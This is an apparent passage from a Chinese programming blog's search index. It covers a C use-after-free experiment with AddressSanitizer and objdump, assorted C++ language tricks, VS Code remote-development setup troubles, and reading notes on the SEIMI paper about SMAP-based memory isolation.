*(ret-&gt;value));} struct testread* ttest() { int i = 10; struct testread *ret = test(\"hello\", &amp;i); return ret;}struct testread* test(void * arg, int *i) { printf(\"0x%p\\n\",arg); struct testread *ret = malloc(sizeof(struct testread)); ret-&gt;arg = (char *)arg; ret-&gt;value = i; return ret;}很显然，ttest函数中声明的int i是局部变量，在ttest函数返回后必然被销毁，因此若”hello”一样是局部变量，那么和i一样会产生use-after-free错误。可惜，make之后，正常通过编译，并在运行之后输出了hello和i的值。问题接踵而来，为什么看起来似乎两个变量都没有被销毁？我在StackOverflow上找到一个非常相似的问题: c - free() not deallocating memory? - Stack Overflow， dereferencing a pointer which refers to deallocated memory is Undefined Behavior，因此编译器的任何行为都是合理的，而因为我们的demo比较小，在函数返回后并没有新的值占用这块空间，因此指针所指向的地址中保存的数据把那个没有被擦除改写，在main函数中print依然可以得到已经被销毁的变量值。同样，里面给出了观察到use-after-free的方法：使用gcc的-fsanitize=address选项，重新编译，看到如下报错:gcc -fsanitize=address -c blah.c -o blah.o -ggcc blah.o -o blahblah.o: In function `main':/home/clf/blah/blah.c:14: undefined reference to `__asan_report_load8'/home/clf/blah/blah.c:14: undefined reference to `__asan_report_load4'/home/clf/blah/blah.c:14: undefined reference to `__asan_report_load8'blah.o: In function `ttest':/home/clf/blah/blah.c:16: undefined reference to `__asan_option_detect_stack_use_after_return'/home/clf/blah/blah.c:16: undefined reference to `__asan_stack_malloc_0'/home/clf/blah/blah.c:17: undefined reference to `__asan_report_store4'blah.o: In function `test':/home/clf/blah/blah.c:24: undefined reference to `__asan_report_store8'/home/clf/blah/blah.c:25: undefined reference to `__asan_report_store8'blah.o: In function `_GLOBAL__sub_D_00099_0_main':/home/clf/blah/blah.c:27: undefined reference to `__asan_unregister_globals'blah.o: In function `_GLOBAL__sub_I_00099_1_main':/home/clf/blah/blah.c:27: undefined reference to `__asan_init'/home/clf/blah/blah.c:27: undefined reference to `__asan_version_mismatch_check_v8'/home/clf/blah/blah.c:27: undefined reference to `__asan_register_globals'collect2: error: ld returned 1 exit statusmakefile:10: recipe for target 'blah' failedmake: *** [blah] Error 1看起来两者都是作为了局部变量，在函数返回后均被销毁。那么回到一开始的问题，字符串字面值存放到了哪里？我们使用objdump查看编译后的.o文件，ttest函数对应的汇编指令如下所示:0000000000000044 &lt;ttest&gt;: 44:\t55 \tpush %rbp 45:\t48 89 e5 \tmov %rsp,%rbp 48:\t48 83 ec 30 \tsub $0x30,%rsp 4c:\tc7 45 f4 0a 00 00 00 \tmovl $0xa,-0xc(%rbp) 53:\t48 8d 45 f4 \tlea -0xc(%rbp),%rax 57:\t48 89 c2 \tmov %rax,%rdx 5a:\t48 8d 0d 07 00 00 00 \tlea 0x7(%rip),%rcx # 68 &lt;ttest+0x24&gt; 61:\te8 1a 00 00 00 \tcallq 80 &lt;test&gt; 66:\t48 89 45 f8 \tmov %rax,-0x8(%rbp) 6a:\t48 8b 45 f8 \tmov -0x8(%rbp),%rax 6e:\t48 89 c1 \tmov %rax,%rcx 71:\te8 59 00 00 00 \tcallq cf &lt;print&gt; 76:\t48 8b 45 f8 \tmov -0x8(%rbp),%rax 7a:\t48 83 c4 30 \tadd $0x30,%rsp 7e:\t5d \tpop %rbp 7f:\tc3 \tretq 在4c所示的位置，使用movl $0xa, -0xc(%rbp)将变量i初始化为10，但是并没有找到与”hello”对应的指令。全局搜索，在.rdata段中找到如下代码:0000000000000000 &lt;.rdata&gt;: 0:\t25 73 20 25 64 \tand $0x64252073,%eax 5:\t0a 00 \tor (%rax),%al 7:\t68 65 6c 6c 6f \tpushq $0x6f6c6c65 c:\t00 30 \tadd %dh,(%rax) e:\t78 25 \tjs 35 &lt;.rdata+0x35&gt; 10:\t70 0a \tjo 1c &lt;.rdata+0x1c&gt;可以看到pushq 指令将”hello”压入了&lt;.rdata&gt;.回到一开始的代码，对于从参数中传递的指针，如果无法确定调用者指针所指向的对象是局部变量还是全局变量，那么我认为最安全的办法是使用malloc重新从堆上分配一块合适大小的内存，并在该指针的声明周期结束时手动释放其所指向的内存空间。" }, { "title": "C++ tricks", "url": "/_posts/C++-tricks/", "categories": "C/C++", "tags": "C/C++", "date": "2022-07-25 00:00:00 +0000", "snippet": " 记录coding or reading时遇到的一些有趣的C++ tricks.##在预处理过程中通知预处理器将##左边和右边的符号连接起来。e.g.:#define f(g, g2) g##g2int main() {\tint var12 = 100;\tprintf(\"%d\", f(Var, 12)); // equal to printf(\"%d\", var12);}attribute...", "content": " 记录coding or reading时遇到的一些有趣的C++ tricks.##在预处理过程中通知预处理器将##左边和右边的符号连接起来。e.g.:#define f(g, g2) g##g2int main() {\tint var12 = 100;\tprintf(\"%d\", f(Var, 12)); // equal to printf(\"%d\", var12);}attribute((flatten))__attribute__((always_inline))存在一种缺陷，即任何调用使用该属性修饰的函数的地方都会将函数内联，而不考虑该函数本身的长度。在极端情况下，由于内联产生的函数过大编译器会将其忽略。e.g.:__attribute__((always_inline)) inline void do_thing(int input) {\t// do something.}void hot_code() {\twhile (condition) {\t\t...\t\tdo_thing(y);\t\t...\t}}此时将会产生巨大的可执行文件，较长的编译时间和更差的cache局部性。使用__attribute__((flatten))进行替代，编译器将会在合适的地方选择内联而在其他地方保持原样，从而尽可能避免inline的缺点。attribute((constructor)) &amp; attribute((destructor))GNU C的feature，constructor用于在main函数之前调用被该标记修饰的函数，destructor用于在main函数返回或调用exit后调用被destructor修饰的函数，用于初始化程序数据。extern “C”实际上是一个链接规范。在使用C++编译器，需要使用C头文件时使用，编译器将其编译成C++ ABI，以供链接器链接。decltype(auto)Typically its use is to allow auto declarations to use the decltype rules on the given expression.返回类型转发:在non-generic代码中，可以自行选择将引用作为返回类型：auto const&amp; Example(int const&amp; i) {\treturn i;}但是在generic code中，如果希望实现完美转发一个返回类型，而不需要知道这个类型是一个值还是引用，那么需要使用decltype(auto)来实现:tempate &lt;class Fun, class... Args&gt; decltype(auto) Example(Fun fun, Args&amp;&amp;... args) { return fun(std::forward&lt;Args&gt;(args)...);}延迟嵌套模板中的返回类型推导template &lt;int i&gt;struct Int{};constexpr auto iter(Int&lt;0&gt;) -&gt; Int&lt;0&gt;;template&lt;int i&gt;constexpr auto iter(&lt;Int&lt;i&gt;) -&gt; decltype(auto){return iter(Int&lt;i - 1&gt;{})}int main() {decltype(iter(Int&lt;10&gt;{}))a;}decltype(i)：返回i的类型decltype((i)): 返回i的引用类型decltype(auto)和auto作为返回类型的区别： expression auto decltype(auto) 10 int int xx int int (x) int int&amp; f() int int &amp;&amp; 我的一些不成熟的想法: auto类型推导似乎只能推导出来值类型，而decltype(auto)可以推导出左值引用、右值引用，因此在不想区分参数是引用类型还是值类型时，适合用decltype(auto)，而在只想要值类型时，可以直接使用autoreference：[1]c++ - What is the difference between auto and decltype(auto) when returning from a function? - Stack Overflow2(c++ - What are some uses of decltype(auto)? - Stack Overflow)unordered_map.emplace返回一个pair，第一个元素是迭代器，第二个元素是布尔值如果发生了插入，则布尔值为true，迭代器指向新插入的元素，如果没有发生插入，则布尔值为false，迭代器指向已经存在的元素。" }, { "title": "vscode踩坑记录", "url": "/_posts/vscode%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/", "categories": "vscode", "tags": "vscode", "date": "2022-07-24 00:00:00 +0000", "snippet": " 流水账记录使用vscode配置C/C++远程开发环境时的一些坑。Overview我们组主要使用C/C++进行llvm相关开发，并且由于同组师兄都在用vscode，所以我这CLion重度用户被迫转向vscode，而vscode之前仅仅被我用于刷leetcode，因此需要从头配置vscode扩展。首先介绍一下两边的系统，服务器系统为ubuntu，版本似乎是20.04，ssh服务已开启，并且只...", "content": " 流水账记录使用vscode配置C/C++远程开发环境时的一些坑。Overview我们组主要使用C/C++进行llvm相关开发，并且由于同组师兄都在用vscode，所以我这CLion重度用户被迫转向vscode，而vscode之前仅仅被我用于刷leetcode，因此需要从头配置vscode扩展。首先介绍一下两边的系统，服务器系统为ubuntu，版本似乎是20.04，ssh服务已开启，并且只能连接内网，我自己的系统是win 11，版本号并不重要因此懒得再查。Remote-SSHvscode本身有比较成熟的ssh扩展Remote-ssh，在extension store中搜索即可下载，之后按照服务器的ip、用户名和密码连接并为其选中配置文件即可成功连接，将远程环境映射到本地。我在这一步并没有出现奇怪的问题。安装C/C++ &amp; C/C++ Extension PackC/C++ 扩展会提供如代码提示、Go To Definition等实用功能，因此需要首先安装这两个扩展。正常来说，如果本地已经安装完毕，在打开extension后对应的扩展上会显示Install On SSH:XXXXXXXX的看起来可以点的按钮，但是我点了八十遍依然毫无反应，甚至连报错都没有，上网Google发现同样有人遇到了一样的问题，解决方案不外乎这么几种：1. 删除.vscode-server文件夹 2. vscode卸载重装 3. 自己下载vsix文件并手动安装。我尝试了第一种方式，并没有任何改变，然后我怀疑是vscode版本不对，于是卸载vscode并重新安装最新版本，依然无效。于是开始尝试手动安装。首先遇到了第一个坑点，在vscode官方文档给出的界面中只有Install一个按钮，点完之后自动跳转到vscode弹出extension中对应的扩展安装界面，于是重新回到原点：Install On ssh 毫无反应。然后上网Google教程，其中一篇博客给出了手动拼接vsix文件下载链接的方式，我尝试了一下，发现不知什么原因，下载出来并不是vsix文件，因此这条路我也没走通。那么真正的vsix文件应该如何获取呢？我想起来扩展应该是开源的，因此在github上可能有，并且成功在这个页面microsoft/vscode-cpptools: Official repository for the Microsoft C/C++ extension for VS Code. (github.com)找到了各种版本的扩展，选择最新版本，成功下载，并上传到服务器，over。在获得了vsix文件之后，安装就变得简单了起来，通常有两种方式安装，并且经过我的尝试发现两种方式应该都是可以的。一种是在vscode extension界面中选择上面的...，然后选中Install by VSIX，在弹出的路径中选择想安装的扩展对应的VSIX文件，等待完成安装即可，安装后会弹窗提醒Reload。另一种是在Terminal中通过命令安装: code --install-extension XXX.VSIX，一样可以安装成功。安装之后的问题在成功安装扩展并在extension界面中显示Enable之后，我打开源码，发现了另一个严重的问题：vscode并没有成功的解析和处理源代码，因此代码跳转依然不可行。我一开始以为要配置cmake、修改默认的编译器位置之类，但经过咨询列表诸位大佬，都说不需要，于是我就开始陷入了深深的自我怀疑之中：发生甚么事了？来回重新启动vscode多次之后依然毫无作用，不得已再度求助Google，看到虽然有人在github上提交了这个问题的issue，但并没有人给出一种可行的解决方案。stackoverflow上对这个问题的解答也不外乎上面提过的几种：删除.vscode-server，重装扩展，重装vscode。.vscode-server来来回回多次卸载后重装，依然半死不活，扩展随着每次删除vscode-server也随之重装。这时我想起上次卸载并没有彻底删除vscode的配置文件，想着不管怎么样先把vscode彻底删掉以保证环境的纯洁，于是开始将C:/User/USERNAME/.vscode文件夹彻底删除，并进一步在文件资源管理器中搜索所有与vscode沾边的文件，一并删除。删除后按照上面所述的步骤重装vscode和扩展，再度打开源码，终于，这次正常了。果然重装能解决99%的问题:dog:但我依然不知道为什么会出现这个问题，或许是因为vscode本身的Bug？" }, { "title": "SEIMI", "url": "/_posts/seimi/", "categories": "论文阅读, Computer Security", "tags": "Computer Security, 论文阅读", "date": "2022-03-02 00:00:00 +0000", "snippet": " SEIMI: Efficient and Secure SMAP-Enabled Intra-process Memory Isolation.” SEIMI uses the highly efficient SMAP for faster intra-process isolation. Its key contribution is actually securely runnin...", "content": " SEIMI: Efficient and Secure SMAP-Enabled Intra-process Memory Isolation.” SEIMI uses the highly efficient SMAP for faster intra-process isolation. Its key contribution is actually securely running the user code in a privileged mode using virtualization techniques.AbstractSEIMI是一个高效的进程内内存隔离技术，用来保护进程的敏感数据。SEIMI的核心是使用Supervisor-mode Access Prevention（SMAP），一种最初被用来防止kernel接触到用户空间的硬件特性，来实现进程内的地址隔离。为了充分利用SMAP，SEIMI在特权模式下执行用户代码。除了使用新的基于SMAP的内存隔离设计，进一步开发了多种新技术来保证用户代码的安全性，例如使用描述符缓存来捕获潜在的段操作以及配置Virtual Machine Control Structure(VMCS)来使与控制寄存器相关联的操作无效。SEIMI优于现有的隔离机制，包括基于内存密钥保护MPK和基于内存保护扩展MPX两种模式。特权模式下执行用户代码不会有问题吗：使用Intel VT-x技术，在VMX non-root模式下的ring 0级别执行用户代码，在VMX root模式下运行内核和其他的进程，并且将privileged data resources保存在VMX root模式下，在访问这些数据时触发VM eixts陷入到VM root模式，对于特权指令根据不同的分类使其无效化或抛出处理器异常并由SEIMI模块模拟这些指令的内容代为执行Descriptor Cache: 为了更快的访问段内存，x86处理器在一个特殊的cache descriptor中保存了每个段描述符的副本。这样可以避免处理器在每次访问内存时都要访问GDT。每个段选择符（CS,SS,DS,ES,FS,GS)的cache包含了所有的GDT中能够找到的bit和字段，包括描述符类型，访问权限，基地址和limit。在保护模式下，无论何时有数据写入段选择符时这些字段GDT或LDT中的数据填充。在实模式下，处理器生成了内部的入口，因为没有在这种情况下没有GDT，并且在实模式下并不是所有的字段都会被填充。1. INTRODUCTION为了保存敏感数据，提出了information hiding(IH)来为敏感数据分配一块随机的地址，然后攻击者将无法知道地址因此也就无法读写敏感数据。内存隔离可以分为基于地址的隔离和基于域的隔离。基于地址的隔离检查不受信任的代码发起的每一次内存访问来确保其不能读取到敏感数据。这一方式的主要开销是由执行检查的代码带来的。最有效的基于地址的隔离是基于Intel Memory Protection Extensiions的MPX。在硬件支持下执行bound-checking.基于域的隔离是将敏感数据保存在一块受保护的内存中。当受信任的代码访问这块内存时被授予访问权限，并在访问结束后撤销权限。从不受信任的代码发起的内存访问并不能获取到访问权限，这一过程的主要开销来自于授予和撤销访问权限的操作。最有效的domain-based的隔离技术是使用Intel Memory Protection Keys(MPK)实现的。现有的address-based和domain-based隔离相对于IH-Based隔离都会产生不小的性能开销。更糟糕的是当工作负载（即需要边界检查或权限转换的内存访问的频率增加）增加时，开销将会极大增加。SEIMI充分利用了SMAP，用来防止kernel code访问用户空间的硬件机制。SEIMI以一种不同的方式使用了SMAP。SEIMI的主要的idea是在特权模式，即ring 0下运行用户代码，并且将敏感数据保存在用户空间中。SEIMI使用了SMAP来防止来自“privileged untrusted user code”来访问”user mode”的敏感数据。在受信任的代码（同时是在privileged mode）访问敏感数据时，SMAP被暂时disable,并在访问结束时重新enable。在SMAP enable时，任何对于用户空间的内存访问将会抛出处理器异常。因为SMAP被RFLAGS寄存器控制，而RFLAGS寄存器是线程私有的，disable SMAP仅仅在当前的线程内有效。因此，暂时关闭SMAP不会允许任何来自其他线程的并发的针对敏感数据的内存访问。SEIMI中对SMAP的使用带来了新的设计问题：如何阻止ring 0 级别的用户代码破坏kernel和滥用需要特权的硬件资源。为了阻止内核污染，选择使用硬件辅助的虚拟化技术，例如Intel 的VT-x来以更高的权限运行内核，例如VMX root模式。用户代码运行在VMX non-root下的ring 0级别。因此，用户代码通过虚拟化就与内核进行隔离（所以是为了隔离内核对于敏感数据的访问？是这样的。）related works: Dune 同样使用了Intel VT-x技术，来提供用户层面的代码。但是这需要代码运行在ring 0级别是安全的和可信的。 所以SEIMI的创新点在于，实现了代码在ring 0级别的安全和可信的运行？为了支持不可信的代码运行在ring 0 级别，那么提出了多种新的技术来阻止用户代码滥用两种类型的硬件资源：（1）特权的数据结构：例如页表（2）特权指令为了阻止用户代码访问特权数据结构，将所有的特权数据结构保存在VMX root模式下，而SEIMI 利用Intel的VT-x来强制所有的特权指令触发VM exit，即陷入到VMX root模式。之后SEIMI在VMX root模式下完成特权指令的执行，这样特权数据结构将永远不会暴露给用户代码。为了阻止特权指令的执行，使用了自动和手动的方式来全面地判定这些指令并且使用SEIMI来使这些指令的执行无害化：（1）触发VM exits并且停止执行（也就是陷入到VM root模式后执行？）（2）使执行结果无效（3）抛出处理器异常并且停止执行。使用SEIMI可能带来的好处：某些需要特权级别才能读的东西，可以无需上下文切换，而由user code直接读完。SEIMI使用SMAP不会产生额外的开销吗？会产生额外的开销，但是相对于MPX和MPK来说，更加安全并且效率更高这是在防止什么攻击？defense mechanism用来防御memory-corruption 攻击，但是这些mechanism需要一个隔离的内存空间来保存其部分敏感数据的安全，SEIMI的作用是为这些防御机制提供一定的隔离的空间，并且SEIMI的安全性与defense mechanism的安全性是可以相互保证的。用户代码运行在VMX non-root模式下的ring0 级别，kernel运行在VMX root模式下，那么这与之前有什么区别？事实上，只有target process运行在VMX non-root模式下的ring 0级别，对于kernel和其他的进程都是运行在VMX root模式下。这样利用SMAP，target process将无法随意写U-page。我的一个新的问题：隔离是指哪方面的隔离？因为隔离的内存区域有S-page和U-page，两个虚拟页表映射到同一块物理区域，同时ring 0级别还可以通过修改AC标识位来开启对U-page的写，在后面禁止POPFQ修改AC标志位，所以target process实际上也不能进行读写，应该是由kernel来决定能否进行读写的 实际上，应该是只允许trusted code在ring 0级别下通过STAC/CLAC两条特权指令开启/关闭SMAP，从而实现了特定的内存区域的隔离contribution： 一个新的domain-based 隔离机制 隔离用户代码的新的技术。 来自实施和评估的新见解BackgroundA. Information Hiding通过随机地址实现，效率高。B. Intra-process Memory Isolation相对于information hiding，这种方法可以在保护敏感数据免受memory-corruption攻击方面提供更强的安全性保证。将敏感数据分成了三类： Confiedntiality only：授予受信任的代码读权限，并从不受信任的代码中撤销权限。在这些机制中，敏感数据是有效的的、随机目标的控制传输的目标地址。由于目标地址仅在加载时被写入，因此他们可以被存放在只读内存中。 Integrity only：某些防御机制，例如CFI的shadow stack，允许敏感数据被受信任的代码读和写，但是只允许被不受信任的代码读。这种机制中，敏感数据包括了控制数据例如返回地址和函数指针，这需要在运行时被防御机制更新。只要完整性得到了保证，攻击者不能使控制流转向 ，因此读权限可以被授予攻击者。 Both confiedntiality and integrity.敏感数据包含着一些秘密信息，例如需要运行时更新的代码地址。因此，不受信任的代码必须被阻止读和写敏感数据。Existing memory-isolation mechanismsaddress-based 模式通常将隔离的内存域放在高地址空间，所以内存访问可以只需要检查一个边界而不是两个边界。Domain-based模式通过暂时关闭访问限制来保护敏感数据。当defense code想要访问敏感数据时，隔离机制暂时禁用访问限制，并在访问结束之后重新开启限制。处理器提供多种硬件支持来控制访问限制，包括MMU中的虚拟内存页限制，EPT和MPK中的物理内存页限制等。Intel MPK的效率最高。特别是，对于只需要完整性保护的敏感数据，domain-based模式通常只需要控制写限制，因此可以在defense code 仅执行写指令时避免切换访问权限C. Intel VT-x ExtensionVT-x将CPU划分为两个操作模式：VMX root模式和VMX non-root模式，前者运行VMM，后者运行客户机OS。VM控制结构促进了VMX不同 模式之间的转换，硬件自动保存和恢复大部分架构状态。VMCS也包括了大量的配置参数，以允许VMM控制客户VM，这让VMM有足够的灵活性来决定将何种硬件暴露给客户机。例如，一个VMM可以配置VMCS来决定VMX non-root模式中的哪些指令和何种异常能够陷入VM root模式。同时，客户机还可以通过VMCALL指令来手动触发VM exit.D. SMAP in Processors为了防止内核无意中执行了用户空间的恶意代码，Intel和AMD提供了SMAP来禁止内核对于用户空间内存的访问。由于kernel需要直接和频繁地访问内存，因此启用和关闭SMAP是非常快的。在x86中，运行时地状态被分成supervisor mode和user mode。当目前的特权级是3时，状态为S-mode，当特权级小于3时，状态是U-mode。同时，内存页被分成supervisor-mode页和user-mode页，划分依据是页表入口中的U/Sbit。当SMAP被启用时，S-mode的代码不能访问U-page.S-mode的代码可以通过设置RFLAGS的AC标志来启用或关闭对于U-page的访问，处理器提供了两个仅能在ring 0级别执行的特权指令STAC和CLAC来设置和取消标志位。另外，POPFQ指令在S-mode执行，AC标志位也可以被修改。我又懵了：SMAP是在什么时候用的？SMAP是拿来解决什么问题的？SMAP是用来防止ring 0级别的target process随意写U-pageSmode的代码不能访问U-page,但是S-mode又可以通过修改标志位来访问这部分代码，那么S-mode的代码能不能访问U-page。III. OverviewA. Threat ModelSEIMI与传统的memory-corruption 防御机制的威胁模型相似。SEIMI的目的是为防范memory-corruption攻击的安全机制提供所需的进程内的内存隔离。目标程序可以是server或本地的程序。假设目标程序可以具有memory-corruption漏洞，因此可以被攻击者获得随意读写的能力。同时假设程序的开发者是无害的，所以恶意软件不在考虑的范围之内。但是目标程序可能允许在一个包装环境中的本地执行，例如，攻击者可能诱导web 用户点击恶意链接，然后恶意脚本可以在浏览器中本地执行。同时假设memory-corruption defense是安全的，也就是说，破坏SEIMI的隔离是破坏防御机制的先决条件。由于防御机制目的是阻止memory-corruption攻击，因此当SEIMI有效时，攻击者无法执行代码劫持攻击或代码重用攻击来恶意地启用或禁用SMAP。换句话说，memory-corruption defense 和 SEIMI的安全性是相互保证的。更进一步的假设是目标OS是安全的并且是可信任的。攻击者能做什么？本地执行自己的恶意代码？攻击者能够诱导用户执行在本地环境中执行恶意代码，但是使用SMAP的target process本身不能是恶意的。target process可以具有memory-corruption，攻击者可以通过这个漏洞进行随意读写B. High-Level Design由于应用代码目标是在用户模式下执行的，所有现有的内存隔离技术仅仅在这种模式下利用了硬件支持，例如Intel的MPK和MPX。这篇论文中，将注意力放到了特权级别下的硬件特性——SMAP。由于SMAP的切换比MPK要快，因此猜测使用SMAP将会导致更好的性能。隔离的内存域分配在U-page中，其他的内存被分配到S-pages中。应用程序在ring0级别运行，因为STAC/CLAC指令仅仅能够在这一级别运行。SMAP是默认启用的。为了能够访问隔离的内存，受信任的代码使用STAC暂时禁用SMAP，当访问结束时，执行CLAC重新启用SMAP来阻止来自不受信任代码的内存访问。虽然disable和re-enable之间存在时间窗口，但是不会影响安全性，因为SMAP是线程私有的，仅仅在当前线程内有效，而不会影响到其他的线程。在ring 0级别运行不受信任的用户代码可能会影响内核的安全性，因此SEIMI借助于Intel VT-x技术将内核运行在ring -1级别， 即在VMX non-root模式下运行客户机，在VMX root模式下运行内核。C. Key Challenge在VMX non-root模式的ring 0级别运行用户代码可以实现基于SMAP的内存隔离而不会影响内核的安全性。 C-1：区分SMAP读和写。在某些情况下，敏感数据可能只需要完整性保护，那么对于读操作的限制就会带来额外的性能开销。在某些其他情况下，又将会需要敏感数据可以被读而不能被写。因此需要区分读操作和写操作。 C-2：阻止使用和操作特权数据结构。客户机VM需要管理其自己的内存、中断、异常、I/O等。某些数据结构如页表、中断描述符表IDT、段描述符表是特权级别才能被访问的。ring 0级别的攻击者可能泄露或修改这些数据结构以获得更高的权限。例如修改页表来使DEP失效。 C-3：禁止滥用特权级别的硬件特性。D. Approach OverviewSeparating read/write in SMAP.为了解决C-1，基于共享内存方法提出了SMAP read/write separation技术，在为敏感数据分配隔离的内存域时，为同一块物理内存空间分配了两块虚拟内存，其中一块作为可以被同时读写的U-page,称为isolated U-page region，另一块被配置为只读的S-page，当受信任的代码需要修改敏感数据时，在关闭SMAP后操作隔离的U-page，当只需要读敏感数据时直接操作隔离的S-page。Protecting privileged data structures.为了解决C-2，将privilegegd data structures和操作放到了VMX特权指令。也就是说这些指令只能够通过例如系统调用、异常、中断来通过内核来执行。Preventing privileged instructions.特权级别下的硬件特性可以通过特权指令来使用。为了解决C-3，全面地收集了所有的特权指令，SEIMI让所有在VMX non-root模式下的特权指令无害化：（i)触发vm exits并停止执行.(ii)使执行结果无效（iii)抛出处理器异常并禁止指令执行。为什么U-page可以被配置为可同时读写的，S-page要被配置为只读的？因为要实现读写分离。target process运行在VMX non-root模式的ring 0级别，SMAP不允许ring 0级别的代码直接写U-page,所以U-page要被配置为可以同时读写的，而ring 0级别的代码可以读写S-page，而要实现隔离一块内存区域的话就不能允许进程读写S-page，所以将其设置为只读。也就是说，S-page的只读靠R/W位来保证，U-page的可写靠SMAP的特性来保证，由此实现的读写分离。IV. Security Executing User Code in ring 0SEIMI的核心是管理VT-x的内核模块。在加载之后启用VT-x并且将内核放在VMX root模式中，使用SEIMI的进程在VMX non-root模式下运行在ring0级别，而其他的进程运行在ring 3级别。这一安排对内核透明，当系统从内核返回到target process时，SEIMI自动切换到VMX模式。SEIMI模块包括三个关键的组件：内存管理、特权指令管理和事件重定向。内存管理组件用来为target process配置常规或隔离的内存以实现基于SMAP的隔离技术。特权指令管理组件用来阻止特权指令被攻击者滥用。事件重定向组件在进程通过系统调用、异常和中断访问内核时，配置和拦截VM exits。在拦截了这些事件之后，将请求传送给kernel进行真正的处理。这三个组件保证了用户代码在ring 0 级别的安全运行，并且实现了基于SMAP的内存隔离。A. Memory Management与传统的VM相比，SEIMI没有在VMX non-root模式下运行的OS来管理内存。因此SEIMI必须完成页表的管理，需要满足以下的要求： R1：宿主机管理来自客户机的系统调用，所以用户空间的内存布局应该在宿主机和客户机的页表中是相同的。（也就是说，需要在Host和guest中维护两份相同的页表，会影响效率？确实会影响效率。将host的0~255个页目录项拷贝到guest的页表中，并且将254和255两个虚拟页表映射到同一块内存区域来作为隔离区的内存。另外SEIMI监视对于host页表的更新，在更新时同时更新Host和guest两者的页表。）监视页表的具体过程 R2：客户机的物理内存应该被宿主kernel直接管理 R3：SEIMI应可以灵活的配置客户机虚拟内存空间中的U-page和S-page R4：客户机不能访问宿主机的内存一种简单的实现方式是复制host用户空间的页表作为SEIMI模式的guest页表，guest 页表包括从guest虚拟地址到host物理地址的直接映射，并且将非隔离的用户空间的页改变为S-page。（host不是内核吗？为什么会有个页表？host维护一个VMX root模式下的页表，实际上也应该是整个操作系统的页表。SEIMI应该是个模块，guest作为一个虚拟机维护自己的页表）因为guest 页表在host的kernel中被分配，并且kernel的内存在guest页表中是不可见的，所以guest的页表将不会暴露给攻击者。（前面说guest的页表是从host复制过去的？好像懂了，页表是保存在内核空间的，攻击者在用户空间无法读取到页表内容？似乎是的，在这个模型中，攻击者似乎只能在VMX root模式的ring3级别下运行，因此无法触及到真正的页表）我好像又懂了，应该把这个东西作为虚拟机来理解，guest的内存实际上是从Host中分配出来的一个大文件，然后guest的页表是从host的物理空间映射过来的内存，而与host的页表无关但是因为页表是树形结构，并且有X86_64有四个级别（PML4，PDPT，PD，PT），因此复制整个页表的开销过大。A shadow mechanism for only page-table root.为了减少开销，提出了一种复用低三级页表的方式，这样只需要复制第一级页表。PML4有512个条目，每个索引512GB的虚拟内存，所以全部的虚拟内存是256TB。其中前256条指向用户空间，后256条指向内核空间，分别是128TB.复制host页表的PML4页到一个新的页，称为PML4‘页。在新的页中清空了后256条索引，因为guest不应该访问到内核的页，然后前256条就拥有了和host相同的索引。Configuring the U-page and S-page.每个页表项都有一个U/Sbit位来表明是用户模式还是supervisor-mode。一个虚拟内存页如果相关联的所有的页表项的U/S bit都是1，那么就是U-page，否则是S-page。在host page table中，所有的用户空间的页都是U-page,但是由于guest的页表是从host的页表中拷贝过来的，所以大部分页表项是完全相同的，(也就是说，拷贝完的时候guest的页都是U-page，因此要有一种方法把部分U-page转变为S-page)采用如下策略配置S-page, PML4’ 的 0~254条页表项被修改为supervisor-mode，即只需要将U/S bit改为1，S-page被用来作为没有隔离的内存域，而第255个页表项依然是用户模式，保留作为隔离的内存域。这样SEIMI将在guest的页表中将non-isolated内存域变成了S-page，而host页表中对应的页还是U-page。Supporting the read-only isolated S-page region.为了将相同的物理页映射为只读的S-page和可读可写的U-page，SEIMI首先保留了PML4‘的第254个页表项，并且让他指向与第255个页表项相同的PDPT页，之后SEIMI将第254个page设置supervisor-mode 页表项，同时反转页表项的R/W位来标记这个页是只读的。(那么之前第254个页表项索引的地址应该放在哪？应该是只能被VMX root下的进程访问，而无法被VMX non-root下的进程访问)B. Intercepting Privileged Instructions拦截特权指令一共三步？ 识别特权指令：识别有两步，第一步是自动分离特权指令，第二步是手动验证。目标是找到具有特权或在ring 0和ring3级别运行时具有不同功能的指令。首先为测试程序的每条指令都插入随机的操作数并在ring 3级别下运行。通过自动捕获保护异常和无效的操作码异常来自动的获取到所有的异常。之后手动查阅Intel的开发手册来确定第一部的所有的指令都是特权指令，同时还找出了在ring 0和ring 3级别下功能不同的指令。Intel VT-x提供了监视特权指令执行的支持，SEIMI利用这一支持来破坏指令正确执行所需的执行条件。如果有多条执行条件，那么选择一条开销最小的进行破坏。 触发VM Exit：当EXIT-Type的指令在VMX non-root模式下执行时，触发VM exit事件并且被VMM捕获。VM exits被分为无条件退出和有条件退出。有条件退出指的是VM exits依赖于VMCS中控制字段的配置。为了阻止这些指令在ring 0执行，SEIMI显式的配置了EXIT-Type的特权指令来触发VM exits. 抛出异常：对于EXP-Type指令，SEIMI在执行过程中抛出异常。 抛出#UD。对于20行的指令，取消了VMCS中对这些指令的支持，所以在执行时将会抛出无效的操作码异常。 抛出#GP。在16~18行的指令，Intel VT-x没有提供任何拦截的支持。这些指令与段操作有关，并且这些指令改变了段寄存器，因为应用在ring 0级别运行，所以攻击者可以切换到任意的段，因此同样需要控制这些指令的执行。观察到在改变段寄存器时，硬件将会使用target selector来访问段描述符表。在这个过程中，如果段描述符表是空的，那么CPU将会抛出一个general protection exception（#GP）。因此可以利用这个特性来清空描述符表。但是这会导致两个问题： 在描述符表被清空时，如何确保程序的正常执行。（段描述符表用于每一条指令的寻址）2.在描述符表是空的时，如何确保与段相关的指令的正常功能。 使用描述符缓存的段切换异常：为了解决这两个问题，使用了X86中的段描述符缓存。 每个段寄存器有两个部分，一个是可见的部分，用来保存段描述符，一个是不可见的部分，用来保存段描述符的信息，隐藏的部分同时被叫做描述符缓存。在执行不切换段的指令时，硬件直接从描述符缓存中读取段描述符的信息。只有当切换段的指令执行时，硬件才会访问段描述符表并且加载目标端的信息到描述符缓存。由于X86允许描述符cache与描述符表不一致，因此可以在cache中填入正确的段描述符信息，并且清空段描述符表。 具体地说，设置了VMCS guest状态的所有字段的段寄存器的内容，包括选择器和相关联的段描述符的信息。当进入VMX non-root状态时，信息将会被直接加载到guest的段寄存器，然后设置GDTR和LDTR的base和limit字段为0。这样不会影响到不切换段的指令的执行，而只会在切换段的指令执行时抛出异常。 所以说，cache是Hidden Part，在不切换段时，硬件直接从cache中读取出来段的信息，而切换段时，才会访问段描述符表，并且把target segment information加载到cache中。 做法是在cache中保存正确的段信息，然后把描述符表清空掉 